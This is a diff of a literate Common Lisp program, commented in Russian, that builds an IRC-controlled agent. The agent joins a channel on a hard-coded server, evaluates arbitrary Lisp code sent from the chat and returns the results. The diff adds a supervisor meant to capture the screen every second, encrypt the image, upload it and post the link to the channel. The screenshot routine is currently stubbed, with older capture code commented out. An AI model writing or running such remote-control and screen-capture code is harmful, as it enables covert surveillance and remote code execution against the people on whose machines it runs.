@@ -51,9 +51,23 @@
 ноль - супервизор принудительно завершает поток, что приводит к его
 перезапуску.
 
+Если соединение с irc-сервером установлено (о чем свидетельствует
+~connection-established-flag~) то супервизор должен запускать новый поток
+репортинга каждую секунду. Задача этого потока - сделать скриншот экрана,
+поместить в png-файл, зашифровать его, загрузить на файлообменник и
+послать полученную ссылку в чат. После выполнения задачи поток должен
+завершиться. Это не обязательно произойдет - он может зависнуть из-за
+ошибки или просто слишком долго работать. Поэтому супервизор отслеживает
+количество таких потоков и если их становится больше чем
+~max-shot-thread-cnt~ удаляет те, которые работают слишком долго.
+
 #+NAME: supervisor
 #+BEGIN_SRC lisp :noweb yes
   (defparameter *outlock* (bt:make-lock "output-lock"))
+
+  (defmacro bprint (var)
+    `(subseq (with-output-to-string (*standard-output*)
+               (pprint ,var)) 1))
 
   (defmacro dbg (msg &rest params)
     "debug output with lock"
@@ -69,7 +83,25 @@
 
   (defparameter *irc-th-stop-flag* nil)
 
+  (defparameter *shot-th-stop-flag* nil)
+
+  (defparameter *connection-established-flag* nil)
+
+  (defparameter *shot-threads* nil)
+
+  (defparameter *max-shot-thread-life-time* 5)
+
+  (defparameter *max-shot-thread-cnt* 5)
+
+  (defparameter *thread-operations-lock*
+    (bt:make-lock "thread-operations-lock"))
+
+
+  ;; irc
   <<irc>>
+
+  ;; shot
+  <<shot>>
 
   (defparameter *supervisor*
     (lambda ()
@@ -81,7 +113,11 @@
                                (handler-case (bt:destroy-thread th)
                                  ;; happens, when thread destroyed already
                                  (TYPE-ERROR () nil))
-                               (setf *watchdog-timer* 0))))
+                               (setf *watchdog-timer* 0)))
+                 (kill-irc (th)
+                   (kill th)
+                   (setf *connection-established-flag* nil)))
+          ;; if there is no irs-thread then start it
           (when (and (null (fnd "irc-th"))       ;; no irc-th
                      (null *irc-th-stop-flag*))  ;; no irc-th stop flag
             (dbg "::supervisor lambda: start irc-th~%")
@@ -91,13 +127,40 @@
              :initial-bindings
              `((*standard-output* . ,*standard-output*)
                (*irc-thread-stop-flag* . ,*irc-th-stop-flag*))))
+          ;; if there is irc-thread, but the watchdog-timer exceeds
+          ;; or the flag is set - then kill it.
           (awhen (fnd "irc-th")
             (when (> *watchdog-timer*  *watchdog-timer-max*)
               (dbg "::supervisor-lambda: kill irc-th by WDG~%")
-              (kill it))
+              (kill-irc it))
             (when *irc-th-stop-flag*
               (dbg "::supervisor-lambda: kill irc-th by FLAG~%")
-              (kill it)))))))
+              (kill-irc it)))
+          ;; kill latecomers shot-threads if there are too many
+          ;; TODO: debug it!
+          ;; (when (> (length *shot-threads*) *max-shot-thread-cnt*)
+          ;;   (loop :for (shot-th . time) :in *shot-threads* :do
+          ;;        (when (> (- time (get-universal-time))
+          ;;                 *max-shot-thread-life-time*)
+          ;;          (dbg "::supervisor-lambda: kill shot-th by lifetime exceed~%")
+          ;;          (kill shot-th))))
+          ;; start new shot-thread (every second when connection-established)
+          (when *connection-established-flag*
+            (let ((bindings `((*standard-output* . ,*standard-output*)
+                              (*shot-thread-stop-flag* . ,*shot-th-stop-flag*)
+                              (*irc-sess* . ,*irc-sess*)
+                              (*irc-user* . ,*irc-user*)
+                              (*irc-serv* . ,*irc-serv*)
+                              (*irc-chan* . ,*irc-chan*)
+                              (*irc-lock* . ,*irc-lock*)
+                              (*irc-conn* . ,*irc-conn*)
+                              (*shot-threads* . ,*shot-threads*))))
+              (bt:with-lock-held (*thread-operations-lock*)
+                (push (cons (bt:make-thread #'shot :name "shot-th"
+                                            :initial-bindings bindings)
+                            (get-universal-time))
+                      ,*shot-threads*)
+                )))))))
 
   (defun supervisor-loop ()
     (setf *watchdog-timer* 0)
@@ -144,7 +207,6 @@
   (defparameter *irc-chan* "#nvrtlessfndout")
   (defparameter *irc-lock* (bt:make-lock "irc-lock"))
   (defparameter *irc-conn* nil)
-  (defparameter *irc-lock* (bt:make-lock "irc-lock"))
 
   <<irc_loop>>
 
@@ -197,8 +259,7 @@ peer: 149.56.134.238:6667" {1008002283}>: Connection reset by peer
        (*irc-serv* . ,*irc-serv*)
        (*irc-chan* . ,*irc-chan*)
        (*irc-lock* . ,*irc-lock*)
-       (*irc-conn* . ,*irc-conn*)
-       (*irc-lock* . ,*irc-lock*)))
+       (*irc-conn* . ,*irc-conn*)))
     (handler-case (cl-irc:read-message-loop *irc-conn*)
       (SB-INT:SIMPLE-STREAM-ERROR (err)
         (dbg "::irc-loop error: ~A~%" (type-of err)))
@@ -212,15 +273,23 @@ peer: 149.56.134.238:6667" {1008002283}>: Connection reset by peer
 После того как мы запустили цикл чтения сообщений следует подождать
 немного, чтобы успели дойти приветственные сообщения канала.
 
-Мы устанавливаем хук чтобы перехватить приход сообщений.
+Мы устанавливаем хук чтобы перехватить приход сообщений и подключаемся к
+каналу.
 
-После этого можно подключаться к каналу и отправить сообщение о
-присутствии.
+После этого мы считаем, что соединение корректно установлено, о чем
+сигнализируем установкой флага *connection-established-flag*
+
+После этого можно отправить сообщение о присутствии.
 
 Затем поток завершается - свою задачу он выполнил.
 
 #+NAME: irc_helper
 #+BEGIN_SRC lisp :noweb yes
+  (defmacro sendmsg (msg &rest params)
+    `(bt:with-lock-held (*irc-lock*)
+       (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))))
+
+  ;; irc-hook
   <<irc_hook>>
 
   (defun irc-helper ()
@@ -231,9 +300,8 @@ peer: 149.56.134.238:6667" {1008002283}>: Connection reset by peer
       (cl-irc:join *irc-conn* *irc-chan*))
     (sleep 1)
     (bt:with-lock-held (*irc-lock*)
-      (cl-irc:privmsg
-       ,*irc-conn* *irc-chan*
-       (format nil "hi"))))
+      (setf *connection-established-flag* t))
+    (sendmsg "hi"))
 #+END_SRC
 
 ** Command hook
@@ -274,8 +342,6 @@ irc-канала. Она должна возвращать T чтобы пред
   <<encrypt>>
   ;; decrypt
   <<decrypt>>
-  ;; bprint
-  <<bprint>>
 
   (defparameter *irc-cmd*
     (lambda (param)
@@ -294,15 +360,10 @@ irc-канала. Она должна возвращать T чтобы пред
           (let ((result (handler-case (bprint (eval (read-from-string  str)))
                           (t (err)
                             (dbg "::irc-cmd error: ~A~%" (type-of err))
-                            (bt:with-lock-held (*irc-lock*)
-                              (cl-irc:privmsg
-                               ,*irc-conn* *irc-chan*
-                               (format nil "ERR: [~A]" (type-of err))))
+                            (sendmsg "ERR: [~A]" (type-of err))
                             (return-from irc-cmd-block nil)))))
             (setf *watchdog-timer* 0)
-            (bt:with-lock-held (*irc-lock*)
-              (cl-irc:privmsg *irc-conn* *irc-chan*
-                              (format nil "=> ~A" result)))
+            (sendmsg "=> ~A" result)
             (dbg "::=> ~A~%" result)
             (finish-output))))))
 
@@ -369,16 +430,7 @@ irc-канала. Она должна возвращать T чтобы пред
       (seq-xor len oct gam)))
 #+END_SRC
 
-** BPrint
-
-#+NAME: bprint
-#+BEGIN_SRC lisp
-  (defmacro bprint (var)
-    `(subseq (with-output-to-string (*standard-output*)
-               (pprint ,var)) 1))
-#+END_SRC
-
-* Snaphot function
+* Snapshot function
 
 Сама функция скриншота должна сделать скриншот и обработать его, а потом
 реинициализировать свой таймер
@@ -389,6 +441,63 @@ irc-канала. Она должна возвращать T чтобы пред
   <<pack_image>>
   <<unpack_image>>
   <<upload>>
+
+  (defun shot ()
+    ;; (dbg "~A~%" *shot-threads*)
+    ;; (sendmsg "shot started")
+    (sleep 100))
+
+  ;; (defparameter *shot-timer*
+  ;;   (make-timer #'(lambda ()
+  ;;                   (shot))
+  ;;               :name "shot" :thread t))
+
+  ;; (defparameter *stop* nil)
+
+  ;; (let ((prev)
+  ;;       (cnt 9999))
+  ;;   (defun shot ()
+  ;;     (let* ((snap (pack-image (x-snapshot)))
+  ;;            (dims (array-dimensions snap)))
+  ;;       (if (> cnt 4)
+  ;;           (progn
+  ;;             (save "~A" dims snap)
+  ;;             (setf prev snap)
+  ;;             (setf cnt 0))
+  ;;           ;; else
+  ;;           (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
+  ;;             (do ((qy 0 (incf qy)))
+  ;;                 ((= qy (car dims)))
+  ;;               (declare (type fixnum qy))
+  ;;               (do ((qx 0 (incf qx)))
+  ;;                   ((= qx (cadr dims)))
+  ;;                 (declare (type fixnum qx))
+  ;;                 (setf (aref xored qy qx)
+  ;;                       (logxor (aref prev qy qx)
+  ;;                               (aref snap qy qx)))))
+  ;;             (save (format nil "~~A_~A" cnt) dims xored)
+  ;;             (setf prev snap)
+  ;;             (incf cnt))))))
+
+  ;; (schedule-timer *shot-timer* 1 :repeat-interval 1)
+
+
+
+  (defun save-png (width height pathname-str image
+                   &optional (color-type :truecolor-alpha))
+    (let* ((png (make-instance 'zpng:png :width width :height height
+                               :color-type color-type))
+           (vector (make-array ;; displaced vector - need copy for save
+                    (* height width (zpng:samples-per-pixel png))
+                    :displaced-to image :element-type '(unsigned-byte 8))))
+      ;; Тут применен потенциально опасный трюк, когда мы создаем
+      ;; объект PNG без данных, а потом добавляем в него данные,
+      ;; используя неэкспортируемый writer.
+      ;; Это нужно чтобы получить третью размерность массива,
+      ;; который мы хотим передать как данные и при этом
+      ;; избежать создания для этого временного объекта
+      (setf (zpng::%image-data png) (copy-seq vector))
+      (zpng:write-png png pathname-str)))
 
   (defun save (frmt-filename-str dims image)
     (block save-block
@@ -423,58 +532,6 @@ irc-канала. Она должна возвращать T чтобы пред
         ;;                              :element-type '(unsigned-byte 8))
         ;;   (write-sequence decoded file-stream))
         )))
-
-  (defparameter *shot-timer*
-    (make-timer #'(lambda ()
-                    (shot))
-                :name "shot" :thread t))
-
-  ;; (defparameter *stop* nil)
-
-  (let ((prev)
-        (cnt 9999))
-    (defun shot ()
-      (let* ((snap (pack-image (x-snapshot)))
-             (dims (array-dimensions snap)))
-        (if (> cnt 4)
-            (progn
-              (save "~A" dims snap)
-              (setf prev snap)
-              (setf cnt 0))
-            ;; else
-            (let ((xored (make-array dims :element-type '(unsigned-byte 8))))
-              (do ((qy 0 (incf qy)))
-                  ((= qy (car dims)))
-                (declare (type fixnum qy))
-                (do ((qx 0 (incf qx)))
-                    ((= qx (cadr dims)))
-                  (declare (type fixnum qx))
-                  (setf (aref xored qy qx)
-                        (logxor (aref prev qy qx)
-                                (aref snap qy qx)))))
-              (save (format nil "~~A_~A" cnt) dims xored)
-              (setf prev snap)
-              (incf cnt))))))
-
-  (schedule-timer *shot-timer* 1 :repeat-interval 1)
-
-
-
-  (defun save-png (width height pathname-str image
-                   &optional (color-type :truecolor-alpha))
-    (let* ((png (make-instance 'zpng:png :width width :height height
-                               :color-type color-type))
-           (vector (make-array ;; displaced vector - need copy for save
-                    (* height width (zpng:samples-per-pixel png))
-                    :displaced-to image :element-type '(unsigned-byte 8))))
-      ;; Тут применен потенциально опасный трюк, когда мы создаем
-      ;; объект PNG без данных, а потом добавляем в него данные,
-      ;; используя неэкспортируемый writer.
-      ;; Это нужно чтобы получить третью размерность массива,
-      ;; который мы хотим передать как данные и при этом
-      ;; избежать создания для этого временного объекта
-      (setf (zpng::%image-data png) (copy-seq vector))
-      (zpng:write-png png pathname-str)))
 #+END_SRC
 
 ** unpack_procedure
